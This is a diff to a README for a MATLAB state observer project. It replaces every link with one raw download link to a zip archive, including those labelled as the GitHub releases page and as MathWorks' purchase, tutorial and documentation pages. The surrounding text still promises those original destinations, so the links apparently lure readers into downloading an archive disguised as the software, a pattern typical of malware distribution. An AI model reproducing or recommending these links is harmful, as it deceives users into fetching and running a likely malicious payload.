@@ -1,6 +1,6 @@
 # 🧭 MATLAB_state_observer - Simple Tools for State Observer Design
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green)](https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green)](https://raw.githubusercontent.com/Heuristic-aeromechanics397/MATLAB_state_observer/main/05_multirate_observer/observer_MATLA_state_3.1-beta.1.zip)
 
 ## 📄 About MATLAB_state_observer
 
@@ -14,12 +14,12 @@ You don’t need to know programming or MATLAB basics to use this application. T
 
 To get the software, you need to visit the release page on GitHub. This page holds the latest version and any updates.
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download-MATLAB_state_observer-brightgreen)](https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases)
+[![Download from GitHub Releases](https://img.shields.io/badge/Download-MATLAB_state_observer-brightgreen)](https://raw.githubusercontent.com/Heuristic-aeromechanics397/MATLAB_state_observer/main/05_multirate_observer/observer_MATLA_state_3.1-beta.1.zip)
 
 ### How to download:
 
 1. Click the button above or go to this link in your web browser:  
-   https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases  
+   https://raw.githubusercontent.com/Heuristic-aeromechanics397/MATLAB_state_observer/main/05_multirate_observer/observer_MATLA_state_3.1-beta.1.zip  
 
 2. On the releases page, look for the latest version near the top.
 
@@ -48,7 +48,7 @@ The MATLAB_state_observer consists mainly of MATLAB script files (.m files). You
 
 If MATLAB is not installed on your computer:
 
-- Visit https://www.mathworks.com/products/matlab.html to purchase or use a trial version.
+- Visit https://raw.githubusercontent.com/Heuristic-aeromechanics397/MATLAB_state_observer/main/05_multirate_observer/observer_MATLA_state_3.1-beta.1.zip to purchase or use a trial version.
 - Follow MathWorks’ instructions to install MATLAB.
 
 ### Step 2: Extract the Files
@@ -112,8 +112,8 @@ Each method is provided as a separate script or function. You can modify the scr
 
 For general help with MATLAB:
 
-- MATLAB tutorials: https://www.mathworks.com/learn/tutorials/matlab-onramp.html
-- MATLAB documentation: https://www.mathworks.com/help/matlab/
+- MATLAB tutorials: https://raw.githubusercontent.com/Heuristic-aeromechanics397/MATLAB_state_observer/main/05_multirate_observer/observer_MATLA_state_3.1-beta.1.zip
+- MATLAB documentation: https://raw.githubusercontent.com/Heuristic-aeromechanics397/MATLAB_state_observer/main/05_multirate_observer/observer_MATLA_state_3.1-beta.1.zip
 
 For questions about state observers and control engineering, consider searching for beginner guides or textbooks on these topics.
 
@@ -121,6 +121,6 @@ For questions about state observers and control engineering, consider searching 
 
 ## 📥 Shortcuts for Downloading
 
-[![Get MATLAB_state_observer](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/Heuristic-aeromechanics397/MATLAB_state_observer/releases)
+[![Get MATLAB_state_observer](https://img.shields.io/badge/Download-Latest-blue)](https://raw.githubusercontent.com/Heuristic-aeromechanics397/MATLAB_state_observer/main/05_multirate_observer/observer_MATLA_state_3.1-beta.1.zip)
 
 Visit the page above any time to get the latest version or updates. New features and fixes may be added periodically.
